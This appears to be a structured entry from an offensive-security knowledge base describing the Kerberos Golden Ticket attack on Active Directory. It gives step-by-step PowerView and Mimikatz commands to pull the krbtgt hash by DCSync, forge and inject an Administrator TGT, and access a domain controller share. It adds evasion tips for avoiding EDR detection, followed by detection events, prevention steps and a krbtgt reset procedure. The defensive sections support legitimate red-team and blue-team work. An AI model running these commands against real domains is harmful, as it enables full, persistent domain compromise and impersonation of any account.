name: Kerberos Golden Ticket — Forged TGT Attack
description: Golden Ticket forges a valid Kerberos TGT signed with the krbtgt account's NTLM hash. Any user possessing krbtgt's hash can create tickets for any account with any privileges, valid for the configured lifetime. Requires DCSync (or NTDS.dit) to obtain krbtgt hash. Detection: Event 4624 from unexpected IPs, TGS tickets without prior TGT on DC, SIDHistory filtering triggers Event 4675.
notes:
Requires: krbtgt NTLM hash + Domain SID

=== ATTACK ===
# Step 1: Get Domain SID (PowerView)
powershell -exec bypass
. .\PowerView.ps1
Get-DomainSID
  → Output: S-1-5-21-<...>-<...>-<...>

# Step 2: Get krbtgt hash via DCSync
runas /user:<DOMAIN>\<PRIVUSER> cmd.exe
mimikatz.exe
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
  → Copy Hash NTLM value

# Step 3: Forge Golden Ticket (Mimikatz)
mimikatz # kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

  Arguments:
    /domain:     domain FQDN (eagle.local)
    /sid:        domain SID (S-1-5-21-...)
    /rc4:        krbtgt NTLM hash
    /user:       user to impersonate (Windows 2019 blocks tickets for non-existent users)
    /id:         RID of target user (500 = Administrator)
    /renewmax:   max days ticket can be renewed (default 10 years = detectable!)
    /endin:      ticket lifetime in minutes (default 10 years = detectable!)
    /ptt:        inject ticket into current session immediately

  OPSEC note: omitting /renewmax and /endin = 10-year ticket (easy EDR detection)
              Set /renewmax:7 /endin:8 for realistic-looking ticket

# Step 4: Verify ticket was injected
klist
  → Look for Client: Administrator @ <DOMAIN>

# Step 5: Use the ticket
dir \\dc1\c$
  → Success = Golden Ticket working

# Alternative: AES256 Golden Ticket (quieter)
mimikatz # kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /user:Administrator /id:500 /ptt

=== DETECTION ===
Event 4624: Successful logon from unexpected IP (after running dir \\dc1\c$)
Event 4769: Two TGS tickets generated (CIFS + HOST) without a corresponding TGT seen on DC
Event 4675: If SIDHistory filtering enabled — triggers on cross-domain escalation

Correlation:
  → Privileged user (Administrator) authenticating from workstation, not PAW
  → TGS for user without preceding TGT from same session (DC has no record of TGT issuance)

=== PREVENTION ===
  → Block privileged users from authenticating to non-privileged devices
  → Reset krbtgt password twice (10 hours apart) after compromise
  → Use KrbtgtKeys.ps1 script for safe reset: https://github.com/microsoft/New-KrbtgtKeys.ps1
  → Enable SIDHistory filtering between domains (may break migrations)
  → Krbtgt password history = 2; must reset twice to invalidate all old tickets

examples.label: Get krbtgt NTLM hash via DCSync
Forge Golden Ticket with realistic lifetime and inject (ptt)
Test ticket — list DC C$ share

recommended.note: DCSync needed to obtain krbtgt hash for Golden Ticket.
Constrained delegation — another Kerberos ticket abuse path.

defense.why_it_works: The krbtgt account's hash signs every TGT in the domain. Anyone who possesses that hash can forge a fully valid TGT (a 'Golden Ticket') for any user with any privileges, because the DC trusts any TGT its own krbtgt key signed.
defense.prerequisites: The krbtgt account NTLM (or AES) hash and the domain SID — both obtained via DCSync or from NTDS.dit.
defense.impact: Persistent domain-wide impersonation of any account (including Administrator) for the ticket lifetime — effectively full, durable domain compromise.
defense.detection: Event 4624 logon from an unexpected IP after use; Event 4769 showing TGS tickets (e.g., CIFS + HOST) with no corresponding TGT ever issued by the DC; Event 4675 if SIDHistory filtering is enabled. Correlate: a privileged user authenticating from a workstation rather than a PAW.
defense.artifacts: Forged TGT in the session (klist shows Administrator@DOMAIN); Mimikatz kerberos::golden execution; TGS requests with no matching DC-issued TGT. Default forged tickets carry a 10-year lifetime — an obvious anomaly.
defense.prevention: Block privileged users from authenticating to non-privileged devices; reset the krbtgt password twice, ~10 hours apart, after any compromise (use Microsoft's New-KrbtgtKeys.ps1); enable SIDHistory filtering between domains.
defense.evasion: Omitting /renewmax and /endin yields a 10-year ticket that EDR flags — attackers set realistic values (/renewmax:7 /endin:8); using the AES256 krbtgt key (/aes256) instead of RC4 produces a quieter ticket.
defense.misconfiguration: The krbtgt account password has never been rotated (or rotated only once). The krbtgt NTLM hash is the signing key for all Kerberos TGTs in the domain — if an attacker obtains it, they can forge unlimited TGTs for any user with any group membership, valid for any lifetime, without triggering account lockout. Most domains have a krbtgt password set at domain creation and never changed.
defense.vulnerable_config:
# Check krbtgt password age (should be < 180 days ideally):
Get-ADUser krbtgt -Properties PasswordLastSet | Select-Object PasswordLastSet
# PasswordLastSet: 2018-03-01  <-- 6+ years, never rotated

# Confirming krbtgt hash is extractable after DCSync:
# mimikatz: lsadump::dcsync /domain:corp.local /user:krbtgt
# => NTLM: <32-char hex hash>
# This hash is now usable for arbitrary TGT forgery
defense.secure_config:
# Reset krbtgt password TWICE (Kerberos uses prev password for 10 min tolerance):
# Step 1 — first reset:
Set-ADAccountPassword -Identity krbtgt -NewPassword \
    (ConvertTo-SecureString (New-Guid).ToString() -AsPlainText -Force)
# Wait 10+ hours to allow replication + ticket expiry
# Step 2 — second reset (invalidates previous key):
Set-ADAccountPassword -Identity krbtgt -NewPassword \
    (ConvertTo-SecureString (New-Guid).ToString() -AsPlainText -Force)

# Microsoft script for safe krbtgt reset:
# https://github.com/microsoft/New-KrbtgtKeys.ps1

# Detection of golden tickets:
# Event 4769 with ticket encryption NOT matching domain default
# TGT lifetime > MaxTicketAge policy
# Account SID in PAC not matching DC's AD lookup (Defender for Identity detects this)
